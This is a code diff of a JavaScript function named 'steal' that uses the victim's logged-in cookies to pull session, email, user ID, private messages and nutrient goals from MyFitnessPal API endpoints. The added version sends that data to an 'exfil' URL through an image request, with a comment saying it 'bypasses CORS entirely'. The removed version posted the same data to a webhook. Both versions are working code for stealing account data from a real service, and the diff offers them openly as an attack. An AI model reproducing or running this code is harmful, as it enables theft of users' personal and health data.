@@ -13,37 +13,29 @@ function addLog(msg) {
 }
 
 async function steal() {
-  const results = {};
-
-  // Test each endpoint individually
-  const endpoints = [
-    ["session", "https://www.myfitnesspal.com/api/auth/session"],
-    ["messages", "https://www.myfitnesspal.com/api/services/messages"],
-    ["subs", "https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en"],
-    ["goals", "https://www.myfitnesspal.com/api/services/nutrient-goals"]
-  ];
-
-  for (const [name, url] of endpoints) {
-    try {
-      const data = await fetch(url, {credentials: "include"}).then(r => r.json());
-      results[name] = data;
-      addLog("OK: " + name);
-    } catch(e) {
-      results[name] = "FAILED: " + e.message;
-      addLog("FAILED: " + name + " - " + e.message);
-    }
-  }
-
-  // Send whatever we got
   try {
-    await fetch(exfil, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify(results)
-    });
-    addLog("Sent to webhook!");
+    const session = await fetch("https://www.myfitnesspal.com/api/auth/session", {credentials:"include"}).then(r=>r.json());
+    addLog("Session: " + JSON.stringify(session));
+
+    const messages = await fetch("https://www.myfitnesspal.com/api/services/messages", {credentials:"include"}).then(r=>r.json());
+    addLog("Messages: " + JSON.stringify(messages));
+
+    const goals = await fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {credentials:"include"}).then(r=>r.json());
+
+    // Send via image src - bypasses CORS entirely
+    const data = encodeURIComponent(JSON.stringify({
+      email: session.email,
+      userId: session.userId,
+      tier: session.currentTier,
+      messages: messages,
+      goals: goals
+    }));
+
+    new Image().src = exfil + "?data=" + data;
+    addLog("Sent via GET!");
+
   } catch(e) {
-    addLog("Webhook send failed: " + e.message);
+    addLog("Error: " + e.message);
   }
 }
 
